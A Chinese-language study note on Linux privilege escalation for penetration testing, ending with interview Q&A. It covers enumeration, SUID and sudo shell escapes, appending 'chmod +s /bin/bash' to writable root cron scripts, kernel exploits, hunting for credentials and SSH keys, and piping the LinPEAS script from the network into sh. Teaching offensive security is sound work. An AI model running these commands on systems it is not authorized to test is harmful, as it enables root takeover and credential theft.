# Linux 提权学习笔记

Linux 提权是渗透测试中至关重要的一环，目标是利用配置错误、漏洞或弱口令，将权限从普通用户提升至 root。本文记录 Linux 提权的核心思路和常用手法。

## 1. 基础信息收集

拿到初始 Shell 后，首先进行系统信息收集，判断提权方向。

```bash
# 当前用户与权限
whoami
id

# 系统版本与内核版本
uname -a
cat /etc/os-release

# 查看 sudo 权限（最重要）
sudo -l

# 查看 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# 查看计划任务
ls -la /etc/cron*
cat /etc/crontab

# 查看网络连接与开放端口
netstat -tlnp
ss -tlnp

# 查看进程（重点关注 root 运行的进程）
ps aux
```

## 2. SUID 提权（最常见）

### 原理
SUID（Set Owner User ID）是一种特殊权限，允许普通用户以文件所有者（通常是 root）的权限执行该程序。如果某个 SUID 程序具备执行命令或读写文件的能力，就可以被用来提权。

### 利用流程
1. 查找具有 SUID 权限的程序：
```bash
find / -perm -4000 -type f 2>/dev/null
```
2. 将找到的程序名放入 [GTFOBins](https://gtfobins.github.io/) 查询，寻找提权 Payload。

### 常见案例
- **find**：
  ```bash
  find . -exec /bin/sh -p \; -quit
  ```
  **踩坑记录**：`-p` 参数必须加上，否则不会保留 root 权限。

- **nmap（老版本）**：
  ```bash
  nmap --interactive
  nmap> !sh
  ```

- **vim**：
  ```bash
  vim -c ':!/bin/sh'
  ```

- **bash**：
  ```bash
  bash -p
  ```

## 3. Sudo 配置错误

### 原理
如果 `/etc/sudoers` 配置不当，允许普通用户以 root 权限执行某些命令，就可以通过该命令提权。

### 利用流程
1. 查看当前用户可执行的 sudo 命令：
```bash
sudo -l
```
2. 如果看到类似 `(ALL) NOPASSWD: /usr/bin/find`，说明可以用 find 提权。
```bash
sudo find . -exec /bin/sh \; -quit
```

### 常见案例
- `sudo vim` → `:!sh`
- `sudo less /etc/passwd` → `!sh`
- `sudo python3` → `import os; os.system("/bin/bash")`

## 4. Cron 任务提权

### 原理
系统定时任务（Cron）通常以 root 权限运行。如果任务脚本文件或所在目录可以被普通用户修改，就可以替换脚本内容，从而以 root 权限执行命令。

### 利用流程
1. 查看计划任务：
```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /var/spool/cron/crontabs/
```
2. 找到以 root 运行且脚本可写（如 `-rwxrwxrwx`）的任务。
3. 修改脚本，添加反弹 Shell 或赋予 `/bin/bash` SUID 权限：
```bash
echo "chmod +s /bin/bash" >> /path/to/script.sh
```
4. 等待 Cron 执行，然后执行 `/bin/bash -p` 提权。

## 5. 内核漏洞提权

### 原理
利用 Linux 内核本身的漏洞，直接从普通用户提升至 root。常见的漏洞有 Dirty Pipe (CVE-2022-0847)、PwnKit (CVE-2021-4034)、DirtyCow (CVE-2016-5195)。

### 利用流程
1. 查看内核版本：
```bash
uname -a
cat /proc/version
```
2. 在 Kali 中搜索对应的 EXP：
```bash
searchsploit linux kernel <版本号>
```
3. 将 EXP 上传到目标机编译并执行。
4. 如果目标机没有 gcc，可以在 Kali 上编译好静态链接的 EXP 再上传。

## 6. 环境变量提权

- **PATH 劫持**：如果 root 运行的脚本中使用相对路径调用命令（如 `ps`、`ls`），且当前用户对某个 PATH 目录有写权限，可以放置同名恶意程序。
- **LD_PRELOAD**：如果 `sudo -l` 显示可以以 root 运行某个程序，并保留了 `LD_PRELOAD` 环境变量，可以劫持共享库。

## 7. 凭据查找（捡漏）

很多时候，不需要复杂提权，直接在系统里“捡漏”就能找到 root 密码或凭据：
```bash
# 历史记录
cat ~/.bash_history
cat /root/.bash_history 2>/dev/null

# 配置文件中的密码
grep -rn "password" /var/www/html/ 2>/dev/null
cat /var/www/html/config.php 2>/dev/null

# SSH 私钥
find / -name "id_rsa" 2>/dev/null
```

## 8. 自动化提权工具

- **LinPEAS**：最全面的 Linux 提权枚举脚本。
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
- **Linux Exploit Suggester**：自动推荐内核漏洞 EXP。

## 9. 面试高频问题

**Q1：Linux 提权有哪些常见方式？**
A：SUID、Sudo 配置错误、Cron 任务、内核漏洞、环境变量（PATH/LD_PRELOAD）、凭据查找。首推 LinPEAS 自动化枚举。

**Q2：SUID 提权的原理是什么？**
A：SUID 允许普通用户以文件所有者（如 root）的权限执行程序。如果某个 SUID 程序具备执行系统命令的能力（如 `find`、`vim`），就可以利用它来获取 root Shell。

**Q3：Cron 任务提权怎么利用？**
A：查看 `/etc/crontab` 等路径，如果某个 root 运行的定时任务脚本文件对普通用户可写，就可以修改该脚本，在里面加入反弹 Shell 或 SUID 提权命令，等待任务执行即可。

**Q4：如果目标没有外网，你怎么上传 LinPEAS？**
A：可以在 Kali 上开启 HTTP 服务（`python3 -m http.server 80`），然后在目标机使用 `wget` 或 `curl` 下载，或者通过 WebShell 上传。
